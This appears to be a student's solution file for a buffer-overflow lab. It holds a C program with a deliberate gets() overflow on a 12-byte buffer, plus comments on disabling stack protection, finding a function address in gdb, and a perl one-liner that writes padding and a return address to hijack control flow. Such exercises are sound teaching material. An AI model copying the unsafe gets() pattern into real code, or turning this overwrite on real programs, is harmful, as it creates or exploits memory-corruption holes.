#include <stdio.h>
#include <unistd.h>
int part_num;

void wrong_func() 
{
	char buf[12];
	puts("Password?");
	gets(buf);
}

void right_func() 
{
	printf("You’ve passed Part %d!\n", part_num);
	exit(0);
}

int main() 
{
	part_num = 1;
	wrong_func();
	puts("Wrong answer.");
	return 0;
}

// First to compile: gcc -g lab5.c -fno-stack-protector
// Next I put a break on line 9 by typing break 9
// Next I put print/x &right_func to get the address for right_func

// Finally I made a perl statement to generate the padding and address: 
// perl -e 'print "AAAAAABBBBBBCCCCCCDDDDDD\xcc\x84\x04\x08"'
// And I piped it to /tmp/input by following it with > /tmp/input
// Then I just typed run < /tmp/input into gdb and it passed, Yay!
